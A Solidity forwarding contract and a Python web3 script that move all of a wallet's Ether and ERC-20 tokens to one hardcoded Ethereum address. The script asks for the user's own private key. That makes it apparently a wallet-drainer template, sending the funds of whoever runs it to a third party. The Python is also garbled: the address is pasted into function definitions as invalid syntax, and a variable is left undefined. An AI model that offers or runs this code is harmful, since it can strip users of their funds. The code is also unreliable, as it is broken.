// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract AutoForwarder {
    address public constant recipient = 0x67405c05a5f43c0149cc92465a008bef609a131d;

    // Fallback function to automatically forward Ether
    receive() external payable {
        payable(recipient).transfer(msg.value);
    }

    // Function to forward all ERC-20 tokens to the recipient
    function forwardTokens(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "No tokens to forward");
        token.transfer(recipient, balance);
    }

    // Function to withdraw Ether in case manual intervention is needed
    function withdrawEther() external {
        payable(recipient).transfer(address(this).balance);
    }
}
from web3 import Web3

# Connect to Ethereum node (Infura or Alchemy)
web3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'))

# Sender's details
sender_address = 'YOUR_WALLET_ADDRESS'
private_key = 'YOUR_PRIVATE_KEY'

# Recipient
recipient = '0x67405c05a5f43c0149cc92465a008bef609a131d'

# Transfer ERC-20 Tokens
def send_tokens(0x67405c05a5f43c0149cc92465a008bef609a131d):
    token_contract = web3.eth.contract(address=token_address, abi=[
        {
            "constant": True,
            "inputs": [{"name": "_owner", "type": "address"}],
            "name": "balanceOf",
            "outputs": [{"name": "balance", "type": "uint256"}],
            "type": "function"
        },
        {
            "constant": False,
            "inputs": [
                {"name": "_to", "type": "address"},
                {"name": "_value", "type": "uint256"}
            ],
            "name": "transfer",
            "outputs": [{"name": "success", "type": "bool"}],
            "type": "function"
        }
    ])

    balance = token_contract.functions.balanceOf(sender_address).call()
    if balance > 0:
        nonce = web3.eth.getTransactionCount(sender_address)
        tx = token_contract.functions.transfer(recipient, balance).buildTransaction({
            'nonce': nonce,
            'gas': 200000,
            'gasPrice': web3.toWei('50', 'gwei')
        })
        signed_tx = web3.eth.account.signTransaction(tx, private_key)
        tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        print(f"Tokens sent! Transaction hash: {web3.toHex(tx_hash)}")

# Transfer Ether
def send_ether():0x67405c05a5f43c0149cc92465a008bef609a131d
    balance = web3.eth.getBalance(sender_address)
    if balance > 0:
        nonce = web3.eth.getTransactionCount(sender_address)
        tx = {
            'nonce': nonce,
            'to': recipient,
            'value': balance - web3.toWei(0.01, 'ether'),  # Leave some Ether for gas fees
            'gas': 21000,
            'gasPrice': web3.toWei('50', 'gwei')
        }
        signed_tx = web3.eth.account.signTransaction(tx, private_key)
        tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        print(f"Ether sent! Transaction hash: {web3.toHex(tx_hash)}")

# Example Usage
send_tokens('TOKEN_CONTRACT_ADDRESS')  # Replace with your token's contract address
send_ether()